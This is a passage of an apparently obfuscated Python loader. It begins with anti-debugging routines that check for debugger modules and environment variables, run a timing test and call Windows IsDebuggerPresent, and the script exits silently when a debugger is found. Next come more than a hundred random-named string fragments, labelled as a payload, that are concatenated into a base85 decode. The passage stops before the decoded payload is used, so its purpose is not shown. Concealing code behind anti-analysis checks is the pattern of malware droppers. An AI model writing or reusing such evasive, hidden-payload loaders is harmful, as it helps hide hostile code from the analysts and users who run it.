#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_ccDsT2wcvy723K = '*KjF6NAq*xdI3}wpwU?5@qOxu{YH~WD7Mm*z_9IZ>Z;z?XmOfvrxr%!-Tm9rd!men!'
_cikInTD3rNgWM4 = '#;JXGvfp51GjJPvxij$CnizOg5B4CQJTnBtACYX1{uGdGACTa4y_|bIedW1BRscD&U'
_cm9KRimYQOrG1o = '3IX8tt=nCH3IJsMJ+t&(ruI`ljo1peW;2Tu&!u<WyJu^>VuFM2>b+6gB379~^)?dt$'
_cqZxRBkRL_Ema9 = 'g8EZ7rT<0Y~ctt2qO9QlBV1w!Zr%^YR4AXN|zXI|@!e8AEtDDHYA2#L9SzIFG5@>4y'
_ctkvx_ceJOLET8 = '<UOeYpIp~v<`O26E7Qyk%U`VQ-R?u+M1Z^YtNbV7sOd2TuIje$kFJS#3zO<wC(dXm%'
_coXZFrInb1OlQ3 = '5@IH+(zqucq?cz~)y5(5v7yzMtX8O&iH0C`3!+iLCDBo*0zbR0)Or$J&=#uaDk_y`*'
_c_SffwvSWXbmiN = '`%9WPvbBj^AlU>w)F713!NzIt^?)gRJb>lr=@?r+aHN(hSh(F%AUK1@;lja%$D|)n7'
_ch_HUY3oO8FVaU = '8u-4V$~$9w^wZ;<G_{OeEY#B9rk8q>aLIooQA#dZ}klWRsWlR{uau8v9YD4TTX~KCA'
_c_R4HnhjQcdgZh = 't~KAS*Mv%XLhpz&=BLN3)5D)@yj>L9#uBvad{AT)z(%PrVbqSEHHJ)I@8a}i=tt?|W'
_cmQWdQrVGQgfyt = '}(~)m0V#gieya-?HrBbhesV_p<`50g*a{q`*rIh1i*Z3>C$84dp8us_P7M4j87TFBJ'
_cez3MshJ7YiJfN = '7S*k6F__if*S03hX^r|)Y%YTJ(kaj_(}!1T!-l=8o55sbu1)fp=D`XxL?eNJk7$IpT'
_cfhIpijCTShXuU = '-CWBC&Sd<JZ;5EkcQJBNS{y&qS+Ct(s-TIZAwD6Zhn^bc;wOh*BlVUZFB+ASIIl@Xz'
_casxYDjrut1raI = 'p^<2-i?ofS(lYv%z188#qu2u93mqAPO)b39-e-k<W0}brOysSxJu3oRoJHd{JO`N&3'
_cd2vWnKEEH6cgs = 'JNF!x>!?}-KjUjkJ?chj%~;;lUTp84t+brRw6o;e`%IvmOWR6+33H7R4{!47XJ3nkL'
_cfkNaKRLPibzyD = 'A24aI>-Uf%=*D=+QPn82<(#^{N&YyJAlUvMmhM$N3)`AaZLml+_owZb1z|$Z5PBYQW'
_cpanHDb0OK2zy1 = '>n-xy>?vqPMiI;lAx85)H9X}Ei<Eo*QPktG=-?|DPNR(bQ^nwLx=*rPmqLMlNN)s!H'
_caf8L2xWvMrl74 = ';vA?joj)Hu||9%{ThnwTTU0Yjh&K%ifaU!RZ}rZ8+-ej<mAiN>8E4nOIk+aNCX$(eZ'
_c_UocgfXnLDyO5 = '>xO{l4f5DBAP1T!rr{+sjWPLm37P#(Tf2Xj5h>uk}pu;3{cFe6w?(W);U|M$tav_iS'
_crOT3xrLixoC3g = 'Qs^;!MaB$9mo=-m4Xe*SWX68FQ#fXre1!v_EMoUbn~68MLc&kOF2o2s%x2a|9fl<dY'
_cjPL3no9eZrVpr = '5jHbJ}lQRwHD4-pdIUl$DHEP|ObS)=on>p=d3@SS?zuYx$TIadAtPG>B+64BLaE8hK'
_cppR01mgal0HQs = 'OzcWK?S7XfcR^EkaN$2g%w!-L%2}()@l*E|96xwKP$LQQZht)|7<0=!$=oJyu@iFh('
_cpN5k7WNpFmGhr = 'OkU^FU3Q(mOq_Wrh|L(9a~v_EWHGqQRNu(*^PT<mq*MmtKH@$fRLisZd|y~590B@zO'
_cxx36y6wVfIUSx = 'uVnOH3&SA$i#+4F}d}DwFs)62OJ^G_{r{$7d;*M~|iWB0Xe&SKj($8JBsp4)>efu&o'
_cdvJirDI5KoOBL = '_kC<%ks-A|<;`zR_kpvF9kS?jYB2u4dq3~uPN$VNi4>XgRdi|thg`iRSZ+EE<3L<I-'
_cdqgQQMprh6XPz = '-mxO#IeH518gcj!YR~MJGu5=f*=0Px%fd~JDGQjx2ov+8P!E!9yx{O@nHnFnnRB}7`'
_cvfkcmf1uZ2pC1 = '#L-;+O{`5+ozH`jAbBdOJ^188o&F|BNdp>_Y3Y08>>Q1FSq#;n@oNtACubPHCY^&0{'
_czgCJWX95jtQvl = '0x1ra(M@ull7XEU1|udai?k3L-jCaI1>$l=^h47Acq8N{r?h(SLtpONg8v`g23a{*U'
_cdC9yUGk4TwfKq = '#^6<tBpIpXsG3;qfJJ7au$VPB>at@p=iFpJkHp_Nz{c^CXb(XYhhra~EaFL_5wyN~k'
_clblaRQjBmoNx9 = 'Phex#k*B+2P^zm_Xko%iG(#9J^}8KGkKzvTXwZW`kR1s$N)gdICWy#97m-x2M(vjN>'
_chJGabuDOk0Fga = '}gH2iPg9aZU|7!q%e3K&kjJmPmb--f5X!JP8YrqI(ncH8S0@Iut0M$hhmXv}A3T)xU'
_cfBk3Jhy4xtBRm = 'g}bEhk*#R~x|QVgcYS=Y(&rc>mJC*L0Xoa<?_!L=R_R5081jN@_Z0AS>0}CsBu`d!o'
_cgEi9g2oMp9Bjg = '^DL#O_=jFI`Jr3x6Q}Hlt;xPSK<?v7y$wBrm`od$X0=QN!*_hiqIe5+-1GCtnn3$8#'
_ct95PqhewFvr3K = 'F>~cNNRbYoa84;!ai}@iTH%z``G2wwZkVMjr02@c6<ZeD7OgdvFNdwE*1Wb>6mrF{K'
_c_ca9eJtGSCmAK = '|)`}8c$KuP(c>w`^0NsX(qnFR^H46*<QZ}7(z_t$Jf^y`r>>|jLi+cX3ZR)iyHN=t*'
_cpMDyy1quQYm0n = '8)$A#%SUw)^FJjediNOh>0irP!Tuz*O)iRyxIfeU>(-NdBmumutS9>SLQCI15L<X(}'
_ctijkiT1qFIZ7n = 'J!jNev|Gm-hPGz4ka<c#Eu$Ia`cZGJS@1{h%S0p^ps~o8gQ*#}-W?3ZDhd#EMvL40P'
_cpjbMz1BRepYMz = '@{wM+--To&+|y`av3KL|CIM}>*HA_Md&YEQ=hn*qy`;$6Z{x_-;7o9(m-zFWttR5U3'
_ckDUovdeUkohf0 = 'zCA+P^ChiKw_6mT`3iHj|SU+7Hm?lVo+#NhU}6_fK=61&qN3J@K>rszyd6#pG#Nk$i'
_ceB27wWhpOgJoR = '`!7~Q$Pd}Z^Ofe@6dV$Dmwo^zOl7uN53+JeZTctr(f3ZgA1dI^JPA=!M_hHmqL#9~o'
_cy0jQcHS8LaqNt = ';e=TzM&_u8?;eroGWAZxnft@8-#APs@i%^iZwa4}x_$+=MVi9xCEqCx?ZCSrTf=0?w'
_czb1hndgVkCRit = 'cKL`F9@}%q_$Jdd9u*O9mA_Z^-j7*B|5#8h^JG=0>$)RGizs$>JUFH>28H$*4ytm+#'
_cik3u_LtVUaUZk = 'q7C;m>zJa^ul8?ZXh&#@(mf>7hRc@xx5Y$Xlj!kbg@#L)*JE$<1*neZ~(6yvCtj6F#'
_cqpAI9M9gL6iNz = '}hg%y9YpDZ*j=gOvZ3D?ka9VlAV1825QS!y@r|qO1!HHq`G-H2My{+D7!NixbOFA@9'
_cgLwIGnnCgXiMN = 'b_pma$&DVg{y2DRGStnI~Z4}#XDly<N*6{nKGU^0#4MI{suO?c6I7ngXP-k5&{l6i#'
_cxR_9adHfFN6Ea = '=oKN3UjP^9Qpbr#ngRg+T-PkhY?{}en?kF3dZ4#)=WgJC|mY!<L$gsMY9Thcq^w>Ro'
_clgIEyYS5ExfQ7 = '3AN5%j5!r&Lpj4s8STxJGKb*op^av7&l^JDT^}2U)nEXNZPVl)f~TM7i9#4mo4vSV>'
_cxiJ5x4aWqf2sm = 's)iLkuZPb&-lYZu?}T!m-0fNIxCYFuW`f?GrJ#4(G%y;>P2RR-<$Xz0!A2`hP>{RXQ'
_cu7EnnJ0zEW4rp = 'Zn-k?%lg4Ffhdg6kh}EBi#J!ogw}S~S8hM~3%U1jAZIeeoR4m3z5A72IuSd`9A$!@z'
_ccSHyfAMQ9qNgX = 'dc1`Im7q|jdWK&|`F+o!d`^}ay}!3tyry$&-!od7sKI2T__Fd%~96!QAFZC~yIt%h`'
_civO6azvxPYRnB = 'YU_b_{>0f4o$6ng}g=y0+G%~o#mGakxL7Gh?=y2nA<Cui_wpxbD7hLDYlB_lijLBf('
_csXgMltw_I02Tx = '=~3$MdHCw(iWdC$7z*dfA5^DHD+SwNEH+7L4!^bea6<G>##14jp>WSO@=Z1<DV?T7@'
_crfPPFqGXA0qo2 = 'IgLYV!e9EFelMm6w+dN+=KC;6w%OCZ2FfSnv%byf)}=q)-3r$JDwmYJC{Z`;YvMU;y'
_cwLPmItFq9lyea = 'hT-A*LRM+G5BLQp*ePZco+?n`EhVNXajginZRh|42)7XKbUp(6pA{Z-4{#;V20>cVo'
_cwNgsmNlcnlxst = '=xH(YpqL254+;RGn*zLAq<#W<LC(}vWSP6{)(%sea7MRJ_W3%6w6OSV7qslDTZ2``T'
_ceVh57NHxb_PHk = 'b0d?~JdT<~h_G4S(gZy4c1Va(gJofl9aCiSNB+YxSRx9FD%IyLSSs9_wO~)QaCW9_?'
_cwfHxkrz8ky9om = '%R6q2kPw^^l{otD)BQdA=Y&!)S~C5G(|grCW&QAke11HYId1ssz+iNEdwY0+)?RVy='
_ceXGzpo36N2qGn = 'gfN8>0$5`PUS9U6^cHPa*G)~-?ANn4>gpa7|{6(`punkH8!f~g_oo`=@lMIZwnU#&R'
_cjkyy8TPHsy6MY = 'd-~EYXVFdZpl+0ZLCh>9E}Yg~=8N+zn21Ha-=BZv0YF!X^~=ggE+$r*wVhVlBG+n7F'
_crdBn0D6hraZPz = 'P!S=<IpoV6+T2l#bW?fw)QLgwiy$<jo1?UG4a&jON5zYjH78Xw><#fFK~Xoq_F8pi1'
_chGwZHRv8YhOEK = ')6iEiKog7Qx(r^1ORI!Z&W~*5)qd@;bO@bbMd%$!w%$SZhA%z@NZo<IY(|J;3b6%Gk'
_ca1_9_CFH0fOeN = 'D>UTwF`chhO&>|d!*5Yu)L<ygj7|$c?Ho<HJ^P%ZfIdCCkz`_?pEq~xu~e8MGZ{FW+'
_cxG16C_a7hgJ_1 = 'USRwVw}nontF;Y6_FO{+j)f}S&5qWRp!+!Xj8}yj=1~>)>oCBWX2b8X6anozeyVPPi'
_cohLa55KwToRNI = 'vGK;A(w(Kp{P`K{0w5#v^EW{)m&SmA81lAYax4Y*d0?H=+b=Pat`IOnT%{mdK}p0fj'
_coB7MIesVlZeWA = 'fh34foB<o(?%W?p!+^`c8j#yAGjB$Km~a6{omaAgBGm?Qyh%jJRtSFnz?+OYOZm*f9'
_ckeWWxcWTmSWTj = ';r^_NM<_tP5cTDK);p{R;a-tp2l|548bVt5oZ07zeR$4X_yX>XZnD!(xjT>HE-qPJi'
_cp4E9EmyW7vtBk = 'p&;$Ay!sT?){gu}nRiQVN~@5u6ItT#0{`ha)W?$=dd;biZUbh!B*@Uh-iuxpKz#0Cm'
_cqsh7wCQDFtYkJ = '`lNxjZ}{oe)U9#1J<Ddd&=X;Ig!FhjdcwT)8>2ejPB)EeJ%Yy1ZuaS1)>W3%8M6yAq'
_cmxevQ67i79cX5 = 'pLp;hsXMVpv?8jwkR#nz~}}H0$B}O_s#Ma1Cz#v3SSfoGm<c_ubtBl6VSYDK$*vE&T'
_cxSp4JzyWEnDBB = 'FB>3-)2IM@8a)MH&@A{mM#ZrZofG^?vVE>RU>{*aonHhR};U(Bchs)yV#<<yxKn}pX'
_ch5dY4BFJM4yqX = 'fUBEB}=`@o6cgt#a?LxVNP7!4>hq+A#Ku(AR&AiP*t(n=q;1_s|!xC>_avn4LQ-nFj'
_cqgbs47ZojvoNc = 'O=0S4Fbu2Ca(z@6&d<FF5kx~LR7ggC)jb2Le9QSQctJ~uvn%2ECmy@p?neGvA3<Cr^'
_ctlN2LE4DvsKkV = 'B=EaQ$px|e_N1#x5zK#@|ka@tqUS;0&2>94rvyMOUxStUues5N3>Z871K5%=N>Ziei'
_csWyZ8d28jCYkz = '6UP&Ehfl-|!j~SMi!O{N%X=w6CLspE=&ujcorz|Bb;iPizoL?g)PO-MQQ%Dyk-BD{U'
_cycvoipnOZxgqF = '2<X4^9i82FfRY)SEaO>X}!+p~h7g}AN3@EK#Yv17{DxN@QG-gK+Y9iU3-jefIuhG4D'
_crhg2SSgs4QK9v = '|_z-RueH(&#6VF!E3e5w!WPV$jGj3TG_`JyC1)==0!y5+4U2Vtrl;1uhqj?io;ZZz_'
_cp0n2qB2KBkrgJ = '^o(%({?AhqAyLKQ&=>d+qe}sJz8w$d4q=f4ai4Z8Yg>ZNte9GX-_CJ^eRzT_GlYm2e'
_cwIr2gtip02IpM = '7uGocj|z9#}2=LKR`(*_+RL1R~y7)h1+V<caZ3bNa$af*AS-k9nm=ZrLuMxwx3x%m2'
_coXGqXDAVxeLHD = '{Z*0v=rdvf^qEPZb5QeEHx)QN%(R#ZJ=5tUm%%5b+{ct+ACq=@29S=o2$QY_%D`&ms'
_cbobbafqn3wgOz = 'prQ!iG&!4i!)Ddi6P?p^S8WaavK3caZl*VPuNaKU*Jmcx_#AK0yFO9{b83|`Gb>O{$'
_ceQD4RDDUfjxNz = '-G?=^mvngZA<*Cp<Q|7W}@Eeo#kuOy>y!naqPlgUm2^-jpa^k%h?+QXro9gTvMFxFE'
_cpcdqAe6zNzGlh = 'RahuS)`}e_S#{mRv>M{)gtEKJnO7dQBC2m8^Zm(3g(3_jgyJ4<Lr&szSmOgMr)rpV%'
_cajqy8VB1LPJp6 = 'dUCnhl#?y40Y8=A1dea|FoYUrooBj_a%8tXp0q>o#39$1`2AD$$Z;JN)&@pwk-HWpS'
_cfJPEkJS8h_C3y = 'Dvau55PS3iykC{-QjYN_O~*&qu3ye(4-LaSdodJnAGM(VtAaph*bNO8zz9o5^1zcH@'
_chlPls5M8Kclyn = 'Hag6txr$bKe{7|^CQ5U(33?Ro|ZI$J|NnCU|lzA8xk9+|`N%p<_p;Ly6zdt*Uc)6b!'
_ccz6edpZwoLUEW = 'i`X77q0j)rdQ9r?==DX?iKkT#=-;S;~GX1B&Ju)K*_(XAtBKSWN(lm>=rO=FLZ_ut0'
_cc_bnO6t3UHnm6 = 'xdo?fk@ky&H8){9{}%UkF}PE_g{W8`k|LtAjbHCPz%fLK<yMtDzB13(G_()=99s>h5'
_ckViz5fwVKQbKi = 'sD)MOh$xCqhwFd%B$Eol{YK1xW3YVF5%j@2z;hLoM%8Jr`_!C7|@|^Jxn<0ATk8`Vx'
_ck5FK2lqfYY0QH = 'dsSkwM=6e6KQ^yGM|K?)PSb7FI<n-eWl^LH@gn;#esTAjx|MiJRTZnL?Sx+B(BY?xd'
_czfuQnYjizOW77 = ';0pF|_#4PlsDR7ZP*C5l|RgvJgjfqPYoPSY|3aAvUEL6aW#?<$ldDC$Uc4s%4AX?0c'
_cbjqssrWgAiEmn = '@Rz;wyFi_=fg@e*LD2s?rA9_+IaqH^77$!!IjU`?k{dYwIR@>FYZ3KI7CYx|JPTdn~'
_ciJ5lowXdzBTUl = 'c-Y$m9`48aA3TPcf~S(<Jk;%w!Di#dnldG}w1r8c09TAR3%E}R_<5fs-C<x$$6feTG'
_c_rJjqNRzzwo0P = '2ZJEST0GVZS4Z4FYO>N4nWa=N{Qc|w)?__fw)3!w2*{l*U7*QkF#>uJnum_#DTLtQ*'
_cqQd0eC1bLpKcv = '^>ZhPjsKwy*{=ob>KM%y0(J9O!yqkN>k|1%K74xYoZ5?*kcjr4;nSp`SJn`f~&%wx?'
_cn9JgxfwPrJaua = 'Mi_vjyspht1A;==9an%e^n_+)91689qx^5*#x6k?I{<N$uyL-*z|r59q54M!1D+}GD'
_cyAGwVF1noRgcY = 'Jh_WUx`3Zi&Ale%|&SIa38#b*|5_KHg1uYGG%s^%h7!Vr*vZOwhD*9lu8bC0!gTy`c'
_ck47jUO2TpSRib = 'NFOg9i#UkBhMLHN8ayleCAsokk5`-MbyzXj#FHh7r!$de9gcstoD=FupIQfxh4E{R%'
_cohNSDhVCOLiXL = '0}t6^rDM=+yDolXzJC;5cNBOD!LdT2Z3+>JbOBIEHdT2Mj79lzVN511^T^>q$D<i#A'
_cqof3PeAiBTmxa = '&A0E;9)BO)=LzDe2}7_}%y*s{||%^ZcjC!u%tL1l@gn0r*iXm;@P+*}|AZM)D~Ud%T'
_cv6F4cqf7EgIa0 = 'L{$drW2cd<eqn%i4j%>@(J=IZS^ex2LjB?i&kajiakr}#|K|4O}6X*vEJ5PZ$;cN28'
_c_S0CnXUu9WRex = 'V^mM8Tb;+yXh;xvP#l|wz>aLp9)#ah&W<=*lYwORr;O5Tha4Ar9waO-gw?OA#j@oZF'
_cvhMOR2qI5lUDz = 'S77C>pCD%kw_yH1CnL~WJtncWQ658xJ%8&C9%2UT<YvQCA1ZHna}xvGO=%A*K&KqFb'
_cx9H6eWG94zMLq = 'TKZS+>hpqz|hl9!31F1k(@v!!Fuv5-qM}`zJ5PB0)G>mvDYGSVVXZbMV2h%gc+A5%t'
_cf5PeEWfeRXHUx = '+H<CNm#EilKbr|A!hf*AQY<s1qGXS2Ubqj-k#ErQwb-lG;&=_icFNoRMWaoKiCO5HW'
_cppGBluxJjoJa9 = 'FMs=cbBd)ok(QkC?znL11^!k+P7;-v+&N{8MWqU6iqm#i{NjFBx6_5K(t*~x~|x?)E'
_cpVHibF2TMEeUq = 'RARDkB^{b5jpK3KPQH2?t)rR!g{M+_pbqy59fk4dF{xD{PYp~}f9-s>q{&+p(TqDBF'
_cvosEbNcXirpxG = '2{hG<$ON!$F;J}x4SEbNh{8J)slmm!vu}=b(vn;63<H8jAM^A&<Om$!1=qs`WB#Gwm'
_cvd_Ks4A_lFnXm = 'gA5KJo9uqzw6ylJSC1W@gS4ox2SyE4&(_X3mx(nFjdR2Ntzak4acqEy|?FPW{LeI@='
_cn0xyaec2IVb63 = 'wkTush@pD|2Fq*Z8nDi7GG)(XfMC=3_$dDVIn--!Vsi*u4Lx^cf<zxIeR%W$by4=Tj'
_ccBT66IKeooyeq = 'C^Y6j<4g@1|NhpjkH<+W>yp#eni8+h~|auJimpg~SdrPNc@NW@am$(j$cw1_!(wt3$'
_c_rK9zoAdCbqE6 = 'o$_O3!(7%mMIh{#7bI1%b^bL5ab0TNYk67?D(9%D-^ch%gdY9eoV<F@NQ}&0WlSQIb'
_chPseuSaqqSK0h = '(|`p)`UD+oG^|Ko0ov(6AEE{Wc^OsAobXv$w8wHkA%)~h;*a%0X)psfD(_ck5J6}qB'
_cyAXot8PtwrYk3 = 's5?pb}}fL@Dm3BZbJSaoIaZBOq}#AcTc=RJ>lS^1+~ye;gXP-Eq>Zel5|sh4tJ7Qwe'
_czsnqjOPl9_MiY = '6+F&>pTLVI2UgGylXT!f>eE(%iC*odo6_bj*m76({mkG-Bck71d#}CcC5dp?k-2Ln5'
_cjwLrNjAP_eGXP = '8r+qnA=i8fCzz#TG|x$(V4T`_Wu467`{rCT;!Tz26%VDsEB7nQ(2%*fV_n`w=e>I|9'
_ctRAOnD8xJ2Z_p = '5VoPI$Yhq<to{@m+Ri$B@Cmhjc!&%G(m<>Yh#mvXoMAR0O=Zf}eizZ)ALqO6CL(^i!'
_cuwWSaePW8zYps = 'xs&wsT!of5Crgq+@O9rib~4Q-as9&vY)~c0iiNObqslr!n^lixp>%$EY5{Q(LnhujU'
_c_Y2c3Of13voHQ = 'oMHB=JFCOy1h=n0EZ|0t7&hHEQk~a4A#nXuGnxI13@{t`~@lR9p;HXxiCC9+0TiY6='
_cxyzThfA5RiZm_ = '1N1pi5RL#G+|{d}3{)-yS&`aOBwT|Jh^l=Qqh<{cW%bW)YqT3qy+%q_`qVbmrkvbW0'
_cz2mKW33bsg2HC = '$xAJ?m?%=<SGKR3M+M6A`YpaPhj^MqnZABajdh(Ho#g1P!DL-M}exyCb0EHe=;CwQ7'
_c_BoejpFZBOC6P = '9u#{`<lVwI`#*@Z!?J0_>CSlk**?AC1#gVS!QCJS5#Qx)fJFo18b8dKx@y(?u3zIQz'
_cgsKsxGK1iwLhv = '%B&-wV(YqPlc$knO$@8j<Dxxi5xd3I*g(*h7P+*qJZwHA+(jFs0=KLh<aOe)u-q*lM'
_cjvbxVJopHW5Jk = 'KexzLDm*VqZDum<n>{J(&_2z`y;TV3HUHX7huzjCb*59Ce83QK-s*4+e=}B1ku>68U'
_cmOaTZc5meddT3 = 'n+8F$N*DG#x!%OlD;*1^l^Y1pMrDiG!oql{Z;6z0t52;iu}Q+vAvp^Yb*&D%nN>H8n'
_c_nEKsQl6m1WlO = 'd?+IVQNmHr0|aGg9&x2!kiDKlW7AUt@TG%pSX!CMhb@d^YdD2-MnobhPcUxD{=&0=9'
_cb8FiHOd2oIoZr = 'Rr*dd#+xV;qYce^Pz0%5X<phY9TJ4!ommTQlqzz(2K{oR@R8$rImQ)3AoAP*+o8uF9'
_cfkOdVxw42ImYA = 'cLo3|*K5KY?;v`&Y4>K=caA-`<QT@R>T!_5Vv_k-Jbz{UYx|zCWYhLdJ(7=UXHF|y4'
_c_mGzeq4ncnP1J = 'fodMBmYwfPMbv>Mj^R%fDs>Y<bsX!K|OSExYWEG_f4-{g_T)dSZx$8C(4MipgN_nrY'
_clCINNxU1UZ4BY = 'H`Yo#<!j#m1XzVj9HT9=LYQ^r(B4wlSlnN0YS}dwN6Ak?y#8(p%}l=j!J)VQpcyU+c'
_cjp0KQPD3NGZ5y = 'zt=?3RwKvF_(BRcwqpu5ff1-X%b8p)}v&0wC-brI(9@@1>6s0@-it5HDa=>5_GZHT<'
_c_yAc0S0T9BL27 = 'L3}Za1jBOJ(lGfPk@1^6_rndaOj3Z(^F-%8eiVsB3#t)Rt-=n~=HOO2MlS>5AGDOCe'
_cviNlXKu75o932 = 'VftLvEl#m?>UfQE#YNI<j&#y$Z^07Vo<_{0!Swm>EX*=v$(e?Am)cv1N!jz{L0M2Di'
_cvJ3npJJ9H_s2D = 'kPF#KzpIsV<ST1%?}feJ_ckyD;^9>jKb+=J_JzlmW{vYWzqI_3i<X5>pjq=yI4Qvxm'
_cjM8HlqveYHWUB = '3MhgZAgs<M*#i4tvX2X7uQX;S%C-=|Grb3_4!hTuk`JA#FQdH1b52Dww!91vO==lq#'
_clThMV4oJctvUO = 'pqLEARLqlQIoJ1(}zi?3rGZ_wmCp~BK9cXe~GQ-QIfH4iIpXvk8wN<baC$F;3NTDkb'
_cjsmxvygauQBvM = 'CAJa}%t5J=h@GLm84knpUr{bxU)~B^E^bhOW)=rW#s-shA)h|vJhTpFkw74tNv)BB&'
_cowqdQppcB1GHX = 't^wChLq%x!s>Q2Fhag8<w#U_|%M>bx?vK^w(BW3$wXer=Yg=SA)Pnh6T-+@~I`X;(X'
_cxqI02ZO2MO14R = 'pRsAEI6`-V@b>(e2Py~L4Uay4+hD%u)zI`^>CX173l25c)l#Q*!<CgS{mW64%9YEL^'
_cjA4NZ8a5JjCNM = 'R}8@v+p|HpFB4Xp_hToT$HGtTi6k1zS3@tF{vS-X&gB+e@oqF&9C2w@SLJgHuT`EKp'
_crHrYoP5HBZ0dJ = 'gafhn~~60YhiDk(CVP?v?OU2*M9LbW_ms|y#h;LNcx%EQ6quhUt1%{0o`a)a1dcx{s'
_caffhSgcz2Ynh5 = '&Z7>QfTOPM`AP9?X9Ia^pfaTUQ?u64}Cc_T7<t^TpCMUdum^F?^4>#?ldtuH^xxc?Z'
_c_FIu2SEyPTJag = 'ZxgP}CS8+b;P$%TxMHH~QAC&4Vct?^D5jNa*J*+8snW}k{HbOIrSDE6-k=})GOAl=L'
_cdZydIZ5W9Y87Q = 'MVf&)hA`@yCiAbSggI2q^b2`UR5JkTSP0&>N#ywu9v9B{+7^XMy^n}Nh}-4i$J`@!)'
_ceaF86UYeUMfID = '|klayv7j*XLF`k80zP;Kq?_3^3n``pE}ecZ;Og)v(-_um(}SST5C%vD!anc1mqKT(!'
_ccUk1te_3We94X = 'x~EYtaq)*f27OXT@kkT}RcSNWhv)krIFiQLkCCU9uxhCZG_K80%9w&{%CqFI^#z-QJ'
_chnLvXw0qy4YVL = 'cb;*EhdlEV3A0$90kxx5Cc}jCtrGh#~w!UxKGk)q%sv`D-AmG>4Q1JWGD7*|++&NzK'
_cpbFsgXNsYPlMj = 'Xi#Iytc@n0*P`exghM9nm5!^SDcZM&)GGDjcnmp}_tBifk6R^>n&LoM>?E^5)r1;9*'
_ct7WRQvEE10GUm = 'I|HDSCKKyaRNWJ5VSIh9gX}##D}@65+z27Y1K*UY`m#bgQM9SelLkg#0X+P0$Ix==J'
_cpIEviJy771ui5 = 'fHy_LvKPmqLLaEk8-wAw_@|whckT(6*jdUXjxgii|IXXe%ekmF58pkiSd8^%yi7(B1'
_clIbwIUl4UnRf0 = 'dBHf<Kz19<Kdo|&<-Ib4K0usDXpu$(M_q_JC1c9h+Rc#U}P;j>Ep0sEb|_5ohXd7EA'
_circmVpOcDsKTd = 'bEv*Hy3^|*QO%mE2>)yLp)mlI&P;0s+?Y(W#eq3lp8tq*tReo0wmc3W#H1HoaY>tDE'
_cpJ4q5axPe23pc = 'Y&&y2SGyAGRQ<tf71Fa-bg9SFlgUt97mRc%iRZDoCROwpxrf*n1Ia5*2#`cN(IC;h$'
_cs0SzZHcoHUOHQ = 'w}2YxS#*9Z6D%I103|+uoJ_@Cibzh`&WIkw{c&rUhDv#PDbf4{c3F%PXjJiU8wqB&a'
_cp4kc_zDK6j8mq = 'S2$N_@NalKlHAKwfQs+a{`gdV95U!0>o4oDT#iN*1VoOH!I%@krp6u5)diA=Q@D47K'
_ctK58lS0n1Lu_C = '*UD?srUp#Im{z1?$<vAd_;P-SKre^w~{=Z#cZ0l>NwCFh0R;?xB&(Fh#gL)Q<Qa7~W'
_ciJxhRv1zNzXQu = '@%-9@+)rEz;kW{O`1(c3#5Lh-?VUv<*(r(eJVjU2&Tk_FeGoII51Q3x^TBT$?(-sQV'
_ch6I12UYMqg3QX = 'R=!*|(iPIxSN399y(j'

_pff_TyND8jgmXm = __import__('base64').b85decode(_ccDsT2wcvy723K + _cikInTD3rNgWM4 + _cm9KRimYQOrG1o + _cqZxRBkRL_Ema9 + _ctkvx_ceJOLET8 + _coXZFrInb1OlQ3 + _c_SffwvSWXbmiN + _ch_HUY3oO8FVaU + _c_R4HnhjQcdgZh + _cmQWdQrVGQgfyt + _cez3MshJ7YiJfN + _cfhIpijCTShXuU + _casxYDjrut1raI + _cd2vWnKEEH6cgs + _cfkNaKRLPibzyD + _cpanHDb0OK2zy1 + _caf8L2xWvMrl74 + _c_UocgfXnLDyO5 + _crOT3xrLixoC3g + _cjPL3no9eZrVpr + _cppR01mgal0HQs + _cpN5k7WNpFmGhr + _cxx36y6wVfIUSx + _cdvJirDI5KoOBL + _cdqgQQMprh6XPz + _cvfkcmf1uZ2pC1 + _czgCJWX95jtQvl + _cdC9yUGk4TwfKq + _clblaRQjBmoNx9 + _chJGabuDOk0Fga + _cfBk3Jhy4xtBRm + _cgEi9g2oMp9Bjg + _ct95PqhewFvr3K + _c_ca9eJtGSCmAK + _cpMDyy1quQYm0n + _ctijkiT1qFIZ7n + _cpjbMz1BRepYMz + _ckDUovdeUkohf0 + _ceB27wWhpOgJoR + _cy0jQcHS8LaqNt + _czb1hndgVkCRit + _cik3u_LtVUaUZk + _cqpAI9M9gL6iNz + _cgLwIGnnCgXiMN + _cxR_9adHfFN6Ea + _clgIEyYS5ExfQ7 + _cxiJ5x4aWqf2sm + _cu7EnnJ0zEW4rp + _ccSHyfAMQ9qNgX + _civO6azvxPYRnB + _csXgMltw_I02Tx + _crfPPFqGXA0qo2 + _cwLPmItFq9lyea + _cwNgsmNlcnlxst + _ceVh57NHxb_PHk + _cwfHxkrz8ky9om + _ceXGzpo36N2qGn + _cjkyy8TPHsy6MY + _crdBn0D6hraZPz + _chGwZHRv8YhOEK + _ca1_9_CFH0fOeN + _cxG16C_a7hgJ_1 + _cohLa55KwToRNI + _coB7MIesVlZeWA + _ckeWWxcWTmSWTj + _cp4E9EmyW7vtBk + _cqsh7wCQDFtYkJ + _cmxevQ67i79cX5 + _cxSp4JzyWEnDBB + _ch5dY4BFJM4yqX + _cqgbs47ZojvoNc + _ctlN2LE4DvsKkV + _csWyZ8d28jCYkz + _cycvoipnOZxgqF + _crhg2SSgs4QK9v + _cp0n2qB2KBkrgJ + _cwIr2gtip02IpM + _coXGqXDAVxeLHD + _cbobbafqn3wgOz + _ceQD4RDDUfjxNz + _cpcdqAe6zNzGlh + _cajqy8VB1LPJp6 